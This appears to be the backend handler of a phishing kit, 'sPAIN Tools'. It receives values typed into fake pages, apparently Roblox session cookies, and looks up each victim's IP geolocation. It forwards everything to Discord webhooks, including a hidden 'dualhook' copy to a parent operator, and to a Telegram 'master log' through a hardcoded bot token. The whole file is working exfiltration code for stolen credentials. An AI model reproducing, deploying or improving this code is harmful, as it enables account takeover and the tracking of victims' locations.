// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

// Send everything raw to a webhook — no Roblox API calls, nothing that touches the cookie
async function sendRaw(webhookUrl, { slots, ip, geo, now, slug, displayName }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks') &&
      !webhookUrl?.includes('discordapp.com/api/webhooks')) return;

  const filled = Object.entries(slots).filter(([, v]) => v && v.trim().length > 0);
  if (filled.length === 0) return;

  // Embed with all slot values + IP/location
  const embedFields = filled.map(([k, v]) => ({
    name: `Slot ${k.replace('slot', '')}`,
    value: v.length > 1020 ? v.substring(0, 1020) + '…' : v,
    inline: false
  }));
  embedFields.push(
    { name: '🌐 IP',       value: ip || 'Unknown',                                         inline: true },
    { name: '📍 Location', value: `${geo?.city || '?'}, ${geo?.country || '?'}`,           inline: true },
    { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                   inline: true },
    { name: '🕐 Time',     value: now,                                                      inline: false }
  );

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `📥 New Submission — ${displayName}`,
          color: 0xc026d3,
          fields: embedFields,
          footer: { text: `sPAIN Tools • ${slug}` },
          timestamp: now
        }]
      })
    });
  } catch (_) {}

  // Send each slot value as a plain message in chunks so NOTHING gets cut off
  for (const [, v] of filled) {
    let remaining = v;
    while (remaining.length > 0) {
      const chunk = remaining.substring(0, 1990);
      remaining = remaining.substring(1990);
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: chunk })
      }).catch(() => {});
    }
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try { record = await redisGet(`slot:${slug}`); }
  catch (err) { return res.status(500).json({ error: 'Redis error', detail: err.message }); }

  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.headers['x-real-ip']
           || req.socket?.remoteAddress
           || 'Unknown';

  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  const ctx = { slots, ip, geo, now, slug, displayName: record.displayName };

  // 1. Send to this page's own webhook
  await sendRaw(record.webhook, ctx);

  // 2. If spawned from a dualhook, also send to the creator's webhook
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendRaw(parent.webhook, ctx);
      }
    } catch (_) {}
  }

  // 3. Telegram master log
  const filled = Object.entries(slots).filter(([, v]) => v && v.trim().length > 0);
  const tgMsg = [
    `📥 <b>New Submission!</b>`,
    `📁 Page: <code>${slug}</code> (${record.displayName})`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    ``,
    ...filled.map(([k, v]) => `Slot ${k.replace('slot','')}: ${v.substring(0, 200)}`),
    `🕐 ${now}`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
